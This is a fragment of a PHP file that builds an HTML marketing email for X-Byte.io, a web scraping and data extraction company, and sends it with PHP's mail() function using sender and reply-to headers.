				                    <li style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; margin-bottom:5px;"><a href="https://www.xbyte.io/case_studies/brand-monitoring-case-study/" style="color:#E61F2D;">Brand Monitoring</a></li>
				                    <li style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300; margin-bottom:5px;"><a href="https://www.xbyte.io/case_studies/python-scrapy-consulting/" style="color:#E61F2D;">Python Scrapy Consulting</a></li>
				                  </ul>
				                </td>
				              </tr>
				            </table>
				          </td>
				        </tr>
				        <tr>
				          <td align="center">
				            <table class="col-700" width="700" border="0" align="center" cellpadding="0" cellspacing="0" style="margin-left:20px; margin-right:20px;">
				              <tbody>
				                <tr>
				                  <td align="center">
				                    <table class="col-700" width="700" border="0" align="center" cellpadding="0" cellspacing="0" style="padding:0 20px;">
				                      <tbody>
				                        <tr>
				                          <td height="50"></td>
				                        </tr>
				                        <tr>
				                          <td align="right">
				                            <table class="col2" width="287" border="0" align="right" cellpadding="0" cellspacing="0">
				                              <tbody>
				                                <tr>
				                                  <td align="center" style="line-height:0px;">
				                                    <img style="" class="images_style" src="https://www.xbyte.io/email-mail-ceo/main.png" width="300" height="300">
				                                  </td>
				                                </tr>
				                              </tbody>
				                            </table>
				                            <table width="287" border="0" align="left" cellpadding="0" cellspacing="0" class="col2" style="">
				                              <tbody>
				                                <tr>
				                                  <td align="center">
				                                    <table class="insider" width="350" border="0" align="center" cellpadding="0" cellspacing="0">
				                                      <tbody>
				                                        <tr>
				                                          <td height="30"></td>
				                                        </tr>
				                                        <tr align="left">
				                                          <td style="font-family:sans-serif; font-size:20px; color:#000; line-height:30px; font-weight: 600;">Data as services</td>
				                                        </tr>
				                                        <tr>
				                                          <td height="5"></td>
				                                        </tr>
				                                        <tr>
				                                          <td style="font-family:sans-serif; font-size:15px; color:#000; line-height:24px; font-weight: 300;">
				                                            <p style="text-align:justify;">With the help of web scraping and data extraction services, it allows business to take unstructured data on the website and turn it into structured.</p>
				                                          </td>
				                                        </tr>
				                                        <tr>
				                                          <td height="5"></td>
				                                        </tr>
				                                        <tr>
				                                          <td><a href="https://www.xbyte.io/service/enterprise-web-crawling-services/" style="background-color:#E61F2D; border-radius:5px; color:#FFF; padding: 5px 10px; text-decoration: none; font-family:sans-serif; ">More</a></td>
				                                        </tr>
				                                        <tr>
				                                          <td height="20"></td>
				                                        </tr>
				                                        <tr>
				                                          <td style="font-family:sans-serif; line-height:30px; background-color:#F1F1F1; padding:5px;">
				                                            <a href="https://www.xbyte.io" style="margin-right:10px; color:#000; text-decoration:none;"><img src="https://www.xbyte.io/email-mail-ceo/icon4.png" style="vertical-align: middle; margin-right:10px;"><span>www.xbyte.io</span></a>
				                                            <a href="mailto:sales@xbyte.io" style="color:#000; text-decoration:none;"><img src="https://www.xbyte.io/email-mail-ceo/icon5.png" style="vertical-align: middle; margin-right:10px;"><span>sales@xbyte.io</span></a>
				                                          </td>
				                                        </tr>
				                                        <tr>
				                                          <td height="20"></td>
				                                        </tr>
				                                        <tr>
				                                        </tr>
				                                      </tbody>
				                                    </table>
				                                  </td>
				                                </tr>
				                              </tbody>
				                            </table>
				                          </td>
				                        </tr>
				                      </tbody>
				                    </table>
				                  </td>
				                </tr>
				                <tr>
				                  <td align="center">
				                    <table align="center" width="100%" border="0" cellspacing="0" cellpadding="0">
				                      <tbody>
				                        <tr>
				                          <td height="50"></td>
				                        </tr>
				                        <tr>
				                          <td align="center">
				                            <table class="col-700" width="700" border="0" align="center" cellpadding="0" cellspacing="0">
				                              <tbody>
				                                <tr>
				                                  <td height="35"></td>
				                                </tr>
				                                <tr>
				                                  <td align="center" style="font-family: sans-serif; font-size:12px; line-height:24px; padding:0 20px;">
				                                    <span>X-Byte.io, X-Byte Enterprise Crawling, Devarc Commerical Complex, Iscon Cross Road, S.G.Highway, Ahmedabad, India</span>
				                                  </td>
				                                </tr>
				                                <tr>
				                                  <td align="center" style="font-family: sans-serif; font-size:12px; line-height:24px; padding:0 20px;">
				                                    <span>If you don&apos;t want to receive our X-Byte.io emails, click here. We have been helping businesses succeed since 2012.</span>
				                                  </td>
				                                </tr>
				                                <tr>
				                                  <td height="30"></td>
				                                </tr>
				                                <tr>
				                                  <td align="center" style="font-family: sans-serif; font-size:12px; line-height:24px; padding:0 20px;"><a href="mailto:info@xbyte.io?Subject=Unsubscribe" style="background-color:#F1F1F1; color:#000; padding:10px; border-radius:5px; text-decoration:none;">UNSUBSCRIBE</a></td>
				                                </tr>
				                                <tr>
				                                  <td height="40"></td>
				                                </tr>
				                              </tbody>
				                            </table>
				                          </td>
				                        </tr>
				                      </tbody>
				                    </table>
				                  </td>
				                </tr>
				              </tbody>
				            </table>
				    </table>
				  </body>
				</html>';

		/*$headers2 = array('Content-Type: text/html; charset=UTF-8');
		$headers2[] = 'From: Alpesh Khunt <test@xbyte.io>';
		$headers2[]   = 'Reply-To: Alpesh Khunt <test@xbyte.io>';*/

		//'Reply-To: webmaster@example.com' . "\r\n" .

		$headers = 'From: Alpesh Khunt <alpesh.khunt@xbyte.io>' . "\r\n" .
		 			'Reply-To: Alpesh Khunt <alpesh.khunt@xbyte.io>' . "\r\n" .
                    'X-Mailer: PHP/' . phpversion();
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

		mail( $to2, $subject2, $body2, $headers );

   }

